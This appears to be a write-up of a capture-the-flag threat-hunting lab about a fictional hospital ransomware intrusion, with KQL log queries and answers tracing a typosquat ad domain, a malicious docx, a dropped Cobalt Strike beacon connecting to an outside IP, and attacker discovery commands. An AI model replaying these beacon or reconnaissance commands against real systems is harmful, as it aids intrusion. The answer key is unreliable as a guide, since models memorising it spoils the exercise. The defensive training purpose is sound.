## Jojo's Hospital: A Ransomware Investigation: Sharks In The Hospital<br>
### **Summary**<br>
To get into the hospital's computer system, the hackers used stolen credentials. These were purchased from another hacker.<br><br>

**Q1. Whose credentials did the hackers use to access the hospital's network? (Enter first and last name)**<br><br>
The answer was already discovered in question 33 from Crpto But The Bad Kind.<br><br>

**Answer: Anthony Davis**<br><br>

**Q2. What was the domain name observed in the sponsored search result?**<br><br>
From the screenshot of the search results, the domain name can be found. Looks similar to raising canes, but its not the actual website.<br><br>

**Answer: raisinkanes.com**<br><br>

**Q3. What is the legitimate domain for Raising Cane's?**<br><br>
Shown in the second result on the screenshot.<br><br>

**Answer: raisingcanes.com**<br><br>

**Q4. How many web requests do we see going to the fake raisinkanes domain?**<br><br>

```
OutboundNetworkEvents
| where url contains "raisinkanes"
| count
```
<br>

**Answer: 26**<br><br>

**Q5. How many unique employees were seen browsing to the fake raisinkanes domains? (hint distinct the src_ip)**<br><br>

```
OutboundNetworkEvents
| where url contains "raisinkanes"
| distinct src_ip 
| count
```
<br>

**Answer: 24**<br><br>

**Q6. Which of the malicious domains used for redirection starts with the word "nothing"?**<br><br>

```
OutboundNetworkEvents
| where url contains "nothing"
```
<br>

The second result shows url with the word 'nothing'.<br><br>

```
https://nothing-to-see-here.net/images/public/Raisin_Kane_Promo_Offer.docx
```

**Answer: nothing-to-see-here.net**<br><br>

**Q7. Which of the malicious domains used for redirection starts with the word "totally"?**<br><br>

```
OutboundNetworkEvents
| where url contains "totally"
```
<br>

**Answer: totally-legit-domain.com**<br><br>

**Q8. What is the name of the docx file they are redirected to?**<br><br>

```
OutboundNetworkEvents
| where url contains "totally" 
| where url contains "docx"
```
<br>

Retrieving the first result, under the url column. <br><br>

```
https://totally-legit-domain.com/published/Raisin_Kane_Promo_Offer.docx
```
<br>

**Answer: Raisin_Kane_Promo_Offer.docx**<br><br>

**Q9. What is the name of the pdf file they are redirected to?**<br><br>

```
OutboundNetworkEvents
| where url contains "pdf"
```
<br>

The first result, under the url column has the name of the pdf file.<br><br>

```
https://nothing-to-see-here.net/search/published/Raisin_Kane_Free_Meal_Voucher.pdf
```
<br>

**Answer: Raisin_Kane_Free_Meal_Voucher.pdf**<br><br>

**Q10. What is the hostname of the first person to download the suspicious docx file?**<br><br>

```
FileCreationEvents
| where filename == "Raisin_Kane_Promo_Offer.docx"
```

The first result retrieved from the above query.<br><br>
<br>

**Answer: RQJQ-MACHINE**<br><br>

**Q11. When did this download occur? (copy and paste the timestamp)**<br><br>
Retrieved from the previous query.<br><br>

**Answer: 5/1/2024, 9:56:50 AM**<br><br>

**Q12. What was the Sha256 hash of the file?**<br><br>
Retrieved from the query in question 10.<br><br>

**Answer: bd886046266b909a8ca5f19f16e5606baf73194a70632c81fdc44ef39ba29712**<br><br>

**Q13. Which browser was used to download this file? (look at the process_name)**<br><br>
Retrieved from the query in question 10.<br><br>

**Answer: chrome.exe**<br><br>

**Q14. What was the name of the malicious file dropped by the attackers?**<br><br>

```
FileCreationEvents
| where hostname == "RQJQ-MACHINE"
| where path contains ".exe"
```
<br>

A file was dropped 27 seconds after the download, with the timestamp of 5/1/2024, 9:57:17 AM.<br><br>

**Answer: cobaltstrike.exe**<br><br>

**Q15. Which command (process_commandline) shows the execution of the Raisin_Kane_Promo_Offer.docx file? (copy and paste the whole command)**<br><br>

```
ProcessEvents
| where hostname == "RQJQ-MACHINE"
| where timestamp between (datetime(2024-05-01) .. datetime(2024-05-02))
| where process_commandline contains "raisin"
```
<br>
Only one result is returned.<br><br>

**Answer: "C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\evbrowne\Downloads\Raisin_Kane_Promo_Offer.docx"**<br><br>

**Q16. What IP address do the hackers connect to using cobalt strike?**<br><br>

```
ProcessEvents
| where hostname == "RQJQ-MACHINE"
| where process_commandline contains "cobalt"
```
<br>

The second result shows the IP address cobaltstrike.exe connected too.<br><br>

```
C:\ProgramData\cobaltstrike.exe --connect 93.238.22.122:50050
```
<br>

**Answer: 93.238.22.122**<br><br>

**Q17. Over what port do the hackers connect to that IP address?**<br><br>
From previous query result, the post can be obtained.<br><br>

**Answer: 50050**<br><br>

**Q18. What was the first discovery command issued by the hackers? (hint: it has to do with a system)**<br><br>
The first discovery command happened at 5/2/2024, 3:45:54 PM.

**Answer: systeminfo**<br><br>

**Q19. How many of these short discovery commands did the attackers run?**<br><br>
6 Discover commands found on the command line.<br><br>

- systeminfo
- ipconfig /all
- netstat -an
- net user
- net localgroup administrators
- net view

**Answer: 6**<br><br>
